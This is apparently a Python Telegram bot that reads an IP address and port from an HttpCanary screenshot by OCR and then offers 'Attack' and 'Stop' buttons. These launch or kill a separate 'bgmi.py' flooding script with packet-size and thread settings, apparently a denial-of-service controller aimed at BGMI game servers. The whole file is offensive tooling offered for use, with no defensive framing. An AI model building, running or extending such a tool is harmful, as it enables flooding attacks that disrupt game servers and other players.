import os, re, sys, signal, subprocess
from io import BytesIO
from datetime import datetime
from PIL import Image
import pytesseract
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from config import TELEGRAM_BOT_TOKEN

selected_target = {}
attack_process = None
pytesseract.pytesseract.tesseract_cmd = "/usr/bin/tesseract"

OWNER_USERNAME = '@Thuanmodessp'
CHANNEL_LINK = 'Thuandepzai'
EXPIRY_DATE = datetime(2030, 8, 2)

def check_expiry():
    if datetime.now() > EXPIRY_DATE:
        print(f"This bot has expired. Join {OWNER_USERNAME} to get a new version.")
        sys.exit()

def extract_ip_port_from_image(image: Image.Image):
    text = pytesseract.image_to_string(image)
    matches = re.findall(r"(\d+\.\d+\.\d+\.\d+)[:\s](100\d+)", text)
    if matches:
        return matches[0][0], int(matches[0][1])
    return None, None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Send HttpCanary screenshot → extract IP/Port → Attack/Stop control buttons."
    )

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global selected_target
    photo = update.message.photo[-1]
    file = await photo.get_file()
    image_bytes = await file.download_as_bytearray()
    image = Image.open(BytesIO(image_bytes))
    ip, port = extract_ip_port_from_image(image)

    if ip and port:
        selected_target[update.effective_chat.id] = (ip, port)
        keyboard = [[KeyboardButton("🚀 Attack"), KeyboardButton("⛔ Stop")]]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(f"Target: `{ip}:{port}`", parse_mode="Markdown", reply_markup=reply_markup)
    else:
        await update.message.reply_text("IP/Port not found. Send clear screenshot.")

async def handle_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_process
    chat_id = update.effective_chat.id
    text = update.message.text.strip()

    if chat_id not in selected_target:
        await update.message.reply_text("No target selected.")
        return

    ip, port = selected_target[chat_id]

    if text == "🚀 Attack":
        if attack_process:
            await update.message.reply_text("Already running!")
            return

        packet_size = 100
        threads = 100
        command = ["python3", "./bgmi.py", ip, str(port), str(packet_size), str(threads)]
        attack_process = subprocess.Popen(command)

        await update.message.reply_text(f"Attack started on `{ip}:{port}`", parse_mode="Markdown")

    elif text == "⛔ Stop":
        if attack_process and attack_process.poll() is None:
            attack_process.terminate()
            attack_process.wait()
            attack_process = None
            await update.message.reply_text("Attack stopped.")
        else:
            await update.message.reply_text("No running attack.")

def main():
    check_expiry()
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_action))
    app.run_polling()

if __name__ == "__main__":
    main()
